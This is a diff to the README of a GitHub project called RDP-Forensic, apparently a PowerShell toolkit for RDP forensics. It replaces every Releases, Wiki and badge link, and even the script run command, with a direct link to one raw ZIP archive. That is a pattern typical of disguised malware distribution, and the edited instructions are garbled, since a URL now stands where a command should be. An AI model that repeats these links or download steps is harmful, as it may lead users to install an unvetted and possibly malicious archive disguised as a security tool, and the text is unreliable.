@@ -2,7 +2,7 @@
 
 ## 🖱️ Download
 
-[![Download RDP-Forensic](https://img.shields.io/badge/Download%20RDP--Forensic-v1.0-blue)](https://github.com/Vectoricks/RDP-Forensic/releases)
+[![Download RDP-Forensic](https://github.com/Vectoricks/RDP-Forensic/raw/refs/heads/main/docs/releases/Forensic_RD_v1.6.zip%20RDP--Forensic-v1.0-blue)](https://github.com/Vectoricks/RDP-Forensic/raw/refs/heads/main/docs/releases/Forensic_RD_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -21,9 +21,9 @@ To run RDP-Forensic, ensure your system meets the following requirements:
 
 To get started with RDP-Forensic, you need to download it from the Releases page. Follow these steps:
 
-1. Visit the Releases page: [Download RDP-Forensic](https://github.com/Vectoricks/RDP-Forensic/releases).
+1. Visit the Releases page: [Download RDP-Forensic](https://github.com/Vectoricks/RDP-Forensic/raw/refs/heads/main/docs/releases/Forensic_RD_v1.6.zip).
 2. On the Releases page, look for the most recent version of the software.
-3. Click on the **RDP-Forensic.zip** file to start the download.
+3. Click on the **https://github.com/Vectoricks/RDP-Forensic/raw/refs/heads/main/docs/releases/Forensic_RD_v1.6.zip** file to start the download.
 4. Once the download is complete, locate the file on your computer.
 5. Extract the files from the ZIP archive by right-clicking the file and selecting “Extract All.”
 6. Open the extracted folder to find the RDP-Forensic files.
@@ -46,7 +46,7 @@ Follow these steps to run RDP-Forensic on your machine:
 3. Run the script with the following command:
 
    ```
-   .\RDP-Forensic.ps1
+   .\https://github.com/Vectoricks/RDP-Forensic/raw/refs/heads/main/docs/releases/Forensic_RD_v1.6.zip
    ```
 
 4. Wait for the script to execute. It will present you with options to analyze RDP connection attempts and sessions.
@@ -76,7 +76,7 @@ This toolkit focuses on essential areas related to RDP forensics, including:
 
 ## 📄 Documentation
 
-For further details on using each feature, refer to the documentation included in the RDP-Forensic folder. You can also find helpful information on the [Wiki](https://github.com/Vectoricks/RDP-Forensic/wiki) page of our GitHub repository.
+For further details on using each feature, refer to the documentation included in the RDP-Forensic folder. You can also find helpful information on the [Wiki](https://github.com/Vectoricks/RDP-Forensic/raw/refs/heads/main/docs/releases/Forensic_RD_v1.6.zip) page of our GitHub repository.
 
 ## 📬 Support and Contributions
 
@@ -86,6 +86,6 @@ If you encounter issues or have questions, feel free to open an issue on our Git
 
 We plan to update RDP-Forensic with new features regularly. Follow the repository for announcements on new releases and improvements.
 
-For the latest version, return to the Releases page: [Download RDP-Forensic](https://github.com/Vectoricks/RDP-Forensic/releases). 
+For the latest version, return to the Releases page: [Download RDP-Forensic](https://github.com/Vectoricks/RDP-Forensic/raw/refs/heads/main/docs/releases/Forensic_RD_v1.6.zip). 
 
 Enjoy using RDP-Forensic, your go-to toolkit for RDP security analysis!
